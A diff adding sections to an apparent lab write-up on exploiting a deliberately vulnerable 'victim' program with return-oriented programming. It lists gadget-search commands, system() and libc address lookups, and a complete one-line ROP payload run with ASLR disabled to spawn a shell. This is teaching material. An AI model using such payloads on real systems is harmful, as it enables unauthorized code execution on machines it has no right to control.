@@ -81,6 +81,88 @@ The first command gets the stack pointer of the victim process. The next gets th
 In this approach we must type the shell commands in the same place we run the last three commands. This is because this is the shell that is taking input in and sending it to our named pipe.
 
 
+##Executable space perversion
 
+If we re-enable the executable space protection with the command:
+
+```
+execstack -c victim
+```
+
+We can see that the above attacks don't work anymore. This is because the stack is now marked nonexecutable and thus our shellcode will not be able to run.
+
+Return oriented programming can fix this issue. 
+
+In return oriented programming, the buffer is not filled with code we need to execute anymore, it is instead filled with addresses of pieces of code we want to run. Each snippet of code is ended with a RET instruction. This RET instruction will increment our stack pointer by 8, thus bringing us to the address of a new piece of code. This code now runs and the cycle continues.
+
+A sequence of code ending in RET is called a gadget.
+
+##Go go gadgets
+
+To pull of our attack using rop, we are going to call the system() function with "/bin/sh" as the argument.
+
+First we find libc's compiled libraray file with the comand:
+
+```
+locate libc.so
+```
+
+Now that we found the proper file, we can search for gadgets in the file using the command:
+
+```
+objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret
+```
+
+This command will get us all the snippets of code that end in a RET instruction in the libc.so file.
+
+According to the notes, we want to execute the instructions:
+
+```
+pop  %rdi
+retq
+```
+
+while the pointer to "/bin/sh" is at the top of the stack. As far as I understand, this will assign the pointer to %rdi which will allow us to execute the shell once the stack pointer is advanced.
+
+We need to find these two instructions somewhere in our libc code. To do this we use the command:
+
+```
+xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}'
+```
+
+This command works by searching the libc code for the corresponding machine code to the instructions we want to execute. After running the command I get 22b9a. This means that at address 0x22b9a the two instructions we want to execute exist. 
+
+Now all we need to do is overwrite our return address with the address of our instructions, the address of "/bin/sh" and finally the address of the system() function. This will guarantee that on the next RET instruction the address of "/bin/sh" will be put into %rdi and the system command will execute the shell.
+
+##More happy returns
+
+While running our victim program in one terminal without ASLR we run the commands:
+
+```
+$ pid=`ps -C victim -o pid --no-headers | tr -d ' '`
+$ grep libc /proc/$pid/maps
+```
+
+The first command gets us the pid of the victim process. The grep command after that allows us to see where libc was loaded into memory for the victim process.
+
+Thanks to our search before, we now know exactly where the instructions we want to execute lie in memory for our victim process. This address is found by adding the location of the instructions in libc to the location where libc was loaded into memory for our victim process. That address winds up being 0x7ffff7a15000 + 0x22b9a.
+
+As to where to put "/bin/sh" we can put it in the beginning of the buffer at location 0x7fffffffdc40 (0x60 needs to be added to this because the new version of Linux organizes the stack differently).
+
+Finally we need the location of the system() function. This can be found by running the command:
+
+```
+nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
+```
+
+We see that the system() function lies at address 0x7ffff7a15000 + 0x46590.
+
+We now have all the pieces to run our attack. We do this by using the following command:
+
+```
+(((printf %0144d 0; printf %016x $((0x7ffff7a15000+0x22b9a)) | tac -rs..; printf %016x 0x7fffffffdca0 | tac -rs..; printf %016x $((0x7ffff7a15000+0x46590)) | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | setarch x86_64 -R ./victim
+```
+
+After hitting enter a few times we see that we are successfully in a shell!
 
 
